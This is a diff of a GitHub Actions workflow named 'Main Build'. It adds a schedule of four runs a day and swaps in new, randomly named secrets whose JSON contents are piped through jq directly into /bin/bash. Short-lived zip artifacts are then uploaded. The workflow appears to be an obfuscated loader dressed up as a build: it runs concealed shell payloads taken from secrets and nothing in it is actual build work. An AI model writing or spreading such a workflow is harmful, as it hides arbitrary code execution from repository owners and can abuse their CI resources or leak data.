@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '58 2,8,14,20 * * *'
 env:
   CI: true
 concurrency:
@@ -14,17 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Process
         env:
-          cypj9: ${{ secrets.cypj9 }}
+          chbg298: ${{ secrets.chbg298 }}
         run: |
-          printf '%s' "$cypj9" | jq -r .lqgzv92 | /bin/bash
-          printf '%s' "$qxann2" | jq -r .nvm02762 | /bin/bash
-          echo $t20 | jq -r .ocih56983 | /bin/bash
-          printf '%s' "$xhs6386" | jq -r .aqt8397 | /bin/bash
-          echo $frlo70 | jq -r .u21 | /bin/bash
+          printf '%s' "$chbg298" | jq -r .sekon88046 | /bin/bash
+          printf '%s' "$vayc436" | jq -r .ff274 | /bin/bash
+          echo $lfxnj559 | jq -r .kdyuh75280 | /bin/bash
+          printf '%s' "$sxxi4375" | jq -r .halkt43 | /bin/bash
+          printf '%s' "$qeq16029" | jq -r .htjbw514 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: zoZwQEAP
+          name: o8EoXsvL
           path: "*.zip"
           retention-days: 1
